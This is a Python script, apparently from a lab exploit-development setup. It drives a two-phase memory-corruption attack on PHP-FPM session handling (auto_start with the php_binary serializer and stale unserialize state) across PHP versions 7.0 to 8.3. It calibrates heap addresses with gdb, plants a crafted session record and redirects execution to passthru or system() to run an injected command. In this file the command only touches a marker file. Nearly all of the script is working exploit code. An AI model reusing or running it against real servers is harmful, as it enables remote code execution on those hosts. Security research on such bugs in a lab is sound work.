#!/usr/bin/env python3
"""Two-phase auto_start harness.

Phase 1 (calib): a harmless 131014-byte php_binary session is decoded twice at
RINIT + explicit re-open, measuring the two session-buffer addresses X1/X2.
Phase 2 (final): fresh worker -> plant stale BG(unserialize) -> build the real
record with X1/X2 -> trigger the same GET -> check marker/survival.

The trigger request is a plain GET (session.auto_start=1), so no multipart
progress allocations happen before the first session decode.
"""
import json, os, re, sys, time, importlib.util

R = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(R, 'scripts'))
import lab

VERS = ['7.0.33', '7.1.33', '7.2.34', '7.3.33', '8.0.30', '8.2.35', '8.3.36']
TRIG = '''<?php
session_write_close();
session_start();
echo "PID=", getmypid(), " STATUS=", session_status(), "\\n";
'''


def ensure_lab(v):
    labd = lab.labdir(v)
    p = os.path.join(labd, 'conf', 'fpm.conf')
    txt = open(p).read()
    if 'session.auto_start' not in txt:
        txt = txt.replace('php_admin_value[session.serialize_handler] = php_binary',
                          'php_admin_value[session.serialize_handler] = php_binary\n'
                          'php_admin_value[session.auto_start] = 1')
        open(p, 'w').write(txt)
    tp = os.path.join(labd, 'www', 'trig.php')
    if not os.path.exists(tp):
        open(tp, 'w').write(TRIG)


def dummy(total):
    # [0x01]['z'] + s:<n>:"<n bytes>";  with total bytes exactly
    for n in range(total, total - 40, -1):
        rec = b'\x01z' + ('s:%d:"' % n).encode() + b'A' * n + b'";'
        if len(rec) == total:
            return rec
    raise SystemExit('cannot build dummy')


def fcgi_get(v, sid, timeout=30):
    spec = importlib.util.spec_from_file_location(
        'fcgi_' + v.replace('.', '_'), os.path.join(lab.labdir(v), 'scripts', 'fcgi.py'))
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    mod.init(os.path.join(lab.labdir(v), 'www'), port=lab.info(v)['port'])
    return mod.request('trig.php', b'', None, cookie='PHPSESSID=' + sid,
                       timeout=timeout, extra_params={'REQUEST_METHOD': 'GET',
                                                      'CONTENT_LENGTH': '0'})


def state(v):
    txt, _ = lab.gdb(v, 'state.gdb', phase='run2_state.txt')
    return {k: lab.kv(txt, k) for k in ('BG_LEVEL', 'BG_DATA', 'P_LAST', 'P_LAST_DTOR',
                                        'P_FIRST_DTOR', 'DTOR_USED')}


def save(v, name, obj):
    p = os.path.join(lab.labdir(v), 'phase', name)
    json.dump(obj, open(p, 'w'), indent=1)
    return p


def main():
    v = sys.argv[1]
    what = sys.argv[2] if len(sys.argv) > 2 else 'all'
    s = lab.info(v)
    ensure_lab(v)
    sid = 'r' + v.replace('.', '')
    st_path = os.path.join(lab.labdir(v), 'phase', 'run2_state.json')
    if what in ('calib', 'all'):
        lab.stop(v)
        time.sleep(0.3)
        master, child = lab.start(v)
        print('calib master=%d child=%d' % (master, child))
        st = lab.drv(v, 'probe')
        print(re.search(r'PID=(\d+)', st).group(0))
        total = int(os.environ.get('TOTAL', '131014'))
        d = dummy(total)
        open(os.path.join(lab.labdir(v), 'sessions', 'sess_' + sid), 'wb').write(d)
        txt, res = lab.gdb(v, 'calib.gdb', lambda: fcgi_get(v, sid),
                           phase='run2_calib.txt', timeout=90)
        hits = re.findall(r'DECODE hit=(\d+) data=(\S+) val=(\S+) len=(\d+) level=(-?\d+)', txt)
        print('calib hits=%s' % [(int(a), b, c, int(d2), int(e)) for a, b, c, d2, e in hits])
        if len(hits) < 2:
            raise SystemExit('calib did not reach 2 decodes:\n' + txt[-1500:])
        X1 = int(hits[0][2], 16) - 0x18
        X2 = int(hits[1][2], 16) - 0x18
        print('X1=%#x X2=%#x' % (X1, X2))
        save(v, 'run2_state.json', {'X1': X1, 'X2': X2, 'sid': sid,
                                    'calib_worker_alive': lab.alive(child),
                                    'calib_master_alive': lab.alive(master)})
        if what == 'calib':
            return
    if what in ('final', 'all'):
        if what == 'final':
            X1 = int(os.environ['X1'], 0)
            X2 = int(os.environ['X2'], 0)
        else:
            stt = json.load(open(st_path))
            X1, X2 = stt['X1'], stt['X2']
        # fresh worker so the plant heap matches the calibrated request shape
        child = lab.rd(os.path.join(lab.labdir(v), 'run', 'child.pid'))
        master = lab.rd(os.path.join(lab.labdir(v), 'run', 'master.pid'))
        if child and lab.alive(child):
            lab.kill_wait(master, child)
        newchild = lab.wait_child(master, exclude=child)
        lab.note_child(v, newchild)
        st = lab.drv(v, 'probe')
        pid = int(re.search(r'PID=(\d+)', st).group(1))
        assert pid == newchild
        print('final worker=%d' % pid)
        out = lab.drv(v, 'plant', os.environ.get('PAD', '0'),
                      os.environ.get('SHAPE', '0'), os.environ.get('KFREE', '0'),
                      env={'PLANT_PAYLOAD': s['plant_payload']})
        assert 'stop' in out
        S = state(v)
        P = int(S['BG_DATA'], 16)
        B0 = int(S['P_LAST_DTOR'], 16)
        plast = int(S['P_LAST'] or 0, 16)
        print('plant P=%#x B0=%#x last=%#x level=%s used=%s' % (
            P, B0, plast, S['BG_LEVEL'], S['DTOR_USED']))
        assert int(S['BG_LEVEL']) == 1 and P and B0
        kind = s.get('target_kind', 'zif')
        cmd = 'touch ' + s['marker']
        if kind == 'system':
            txts, _ = lab.gdb(v, 'sys.gdb', phase='run2_sys.txt')
            target = int(lab.kv(txts, 'SYSTEM'), 16)
            key_line = cmd + ';#'
            key_len = ord(key_line[0])
            key_text = key_line[1:]
            opts = dict(mode='final', zero=False, x1=X1, x2=0, p=P, b0=B0,
                        total=int(os.environ.get('TOTAL', '131014')),
                        target=target, a_target=int(s['A'], 16), real_p=bool(s['real_p']),
                        p_last=plast, key_len=key_len, key_text=key_text,
                        no_frame=True, cmd='')
        else:
            target = int(s['zif_passthru'], 16)
            opts = dict(mode='final', zero=False, x1=X1, x2=X2, p=P, b0=B0,
                        total=int(os.environ.get('TOTAL', '131014')),
                        target=target, a_target=int(s['A'], 16), real_p=bool(s['real_p']),
                        p_last=plast, key_len=s['key_len'], key_text='', cmd=cmd)
        m = lab.build(v, sid, opts)
        print('record %s' % {k: m[k] for k in ('total', 'rec1_len', 'L', 'payload_start',
                                               'K', 'F', 'cmd_off')})
        note = {k: s[k] for k in ('version', 'port', 'A', 'zif_passthru', 'target_kind')}
        note.update({'X1': hex(X1), 'X2': hex(X2), 'P': hex(P), 'B0': hex(B0),
                     'p_last': hex(plast), 'K': m.get('K'), 'F': m.get('F'),
                     'target': hex(target), 'rec1_len': m['rec1_len'],
                     'payload_start': m['payload_start'], 'total': m['total']})
        if kind == 'system':
            note['system'] = hex(target)
            note['command'] = key_line
        gscript = os.environ.get('FINAL_GDB') or (
            'final_system.gdb' if kind == 'system' else 'final.gdb')
        txt, res = lab.gdb(v, gscript, lambda: fcgi_get(v, sid),
                           phase='run2_final.txt', timeout=90)
        lines = [l for l in txt.splitlines() if re.match(
            r'^(DECODE|SYSTEM|ZIF_PASSTHRU|PHP_EXEC|PHP_EXEC_EX|F=|FLUSH|STOPPED|AFTER|Program received|0x7f)', l)]
        print('\n'.join(lines))
        note['final_gdb'] = lines
        note['marker'] = os.path.exists(s['marker'])
        note['worker_alive'] = lab.alive(newchild)
        rq = re.findall(r'PID=(\d+)', (res or {}).get('stdout', b'').decode('latin1'))
        note['response_pid'] = int(rq[-1]) if rq else None
        note['same_worker'] = note['response_pid'] == newchild
        note['master_alive'] = lab.alive(master)
        txt, _ = lab.gdb(v, 'ser.gdb', phase='run2_ser.txt')
        note['ser'] = {k: lab.kv(txt, k) for k in ('PSER2', 'PSER3NAME', 'PSER3ENC',
                                                   'BG_LEVEL', 'BG_DATA')}
        save(v, 'run2_result.json', note)
        print('RESULT', json.dumps({k: note[k] for k in (
            'version', 'marker', 'worker_alive', 'same_worker', 'master_alive', 'ser')}, indent=1))


if __name__ == '__main__':
    main()
